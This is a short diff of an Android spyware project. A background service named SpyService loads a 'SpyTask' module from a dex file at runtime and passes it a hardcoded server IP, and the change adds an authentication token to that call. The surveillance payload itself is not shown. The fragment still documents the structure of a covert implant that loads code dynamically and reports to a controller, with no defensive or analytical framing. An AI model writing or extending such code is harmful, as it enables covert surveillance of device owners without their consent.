@@ -6,17 +6,14 @@ import android.app.NotificationManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Color;
-import android.os.Environment;
 import android.os.IBinder;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.JobIntentService;
 import androidx.core.app.NotificationCompat;
-import com.example.spyapp.dex.DexTask;
 import dalvik.system.PathClassLoader;
 
 import java.io.*;
-import java.lang.reflect.Method;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.concurrent.ExecutorService;
@@ -29,6 +26,7 @@ public class SpyService extends JobIntentService {
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
     private Object dexTask;
     private final String IP = "192.168.0.102";
+    private final String TOKEN = "";
 
     @Override
     public void onCreate() {
@@ -121,7 +119,7 @@ public class SpyService extends JobIntentService {
 
             PathClassLoader classLoader = new PathClassLoader(file.getAbsolutePath(), getClassLoader());
             Class<?> clazz = classLoader.loadClass("com.example.dexmodule.SpyTask");
-            c = (Object) clazz.getDeclaredConstructor(Context.class, String.class).newInstance(getBaseContext(), IP);
+            c = (Object) clazz.getDeclaredConstructor(Context.class, String.class, String.class).newInstance(getBaseContext(), IP, TOKEN);
 
             logger.info("dex class loaded.");
 
